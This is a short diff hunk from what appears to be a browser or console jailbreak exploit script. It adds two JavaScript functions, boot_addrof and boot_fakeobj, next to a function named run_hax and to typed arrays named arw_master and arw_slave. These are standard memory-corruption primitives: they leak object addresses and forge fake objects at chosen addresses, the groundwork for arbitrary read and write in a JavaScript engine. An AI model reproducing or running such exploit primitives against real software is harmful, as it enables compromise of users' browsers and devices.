@@ -678,6 +678,17 @@ function run_hax() {
     load_exploit_done(); 
     }
 }
+function boot_addrof(obj) {
+arrays[257][32] = obj;
+union_f[0] = arrays[258][0];
+return union_i[1] * 0x100000000 + union_i[0];
+}
+function boot_fakeobj(addr) {
+union_i[0] = addr;
+union_i[1] = (addr - addr % 0x100000000) / 0x100000000;
+arrays[258][0] = union_f[0];
+return arrays[257][32];
+}
 var arw_master = new Uint32Array(8);
 var arw_slave = new Uint8Array(1);
 var obj_master = new Uint32Array(8);
